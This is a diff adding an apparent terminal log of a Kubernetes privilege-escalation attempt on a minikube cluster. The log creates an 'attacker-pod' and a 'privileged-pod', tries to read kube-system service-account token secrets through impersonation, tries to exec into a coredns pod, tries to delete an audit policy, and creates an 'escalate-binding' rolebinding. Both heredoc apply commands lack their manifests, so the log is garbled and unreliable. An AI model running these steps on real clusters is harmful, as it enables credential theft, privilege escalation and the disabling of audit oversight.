@@ -1,0 +1,21 @@
+> kubectl create ns secure-ops
+namespace/secure-ops created
+> kubectl config set-context --current --namespace=secure-ops
+Context "minikube" modified.
+> kubectl create sa monitoring
+serviceaccount/monitoring created
+> kubectl run attacker-pod --image=alpine --command -- sleep 3600
+pod/attacker-pod created
+> kubectl auth can-i get secrets --as=system:serviceaccount:secure-ops:monitoring
+no
+> kubectl get secret -n kube-system $(kubectl get secrets -n kube-system | grep default-token | head -n1 | awk '{print $1}') --as=system:serviceaccount:secure-ops:monitoring
+Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:secure-ops:monitoring" cannot list resource "secrets" in API group "" in the namespace "kube-system"
+> cat <<EOF | kubectl apply -f -
+pod/privileged-pod created
+> kubectl exec -n kube-system $(kubectl get pods -n kube-system | grep coredns | awk '{print $1}' | head -n1) -- cat /etc/resolv.conf
+OCI runtime exec failed: exec failed: unable to start container process: exec: "cat": executable file not found in $PATH: unknown
+command terminated with exit code 127
+> kubectl delete -f /etc/ssl/certs/audit-policy.yaml --as=admin
+error: the path "/etc/ssl/certs/audit-policy.yaml" does not exist
+> cat <<EOF | kubectl apply -f -
+rolebinding.rbac.authorization.k8s.io/escalate-binding created
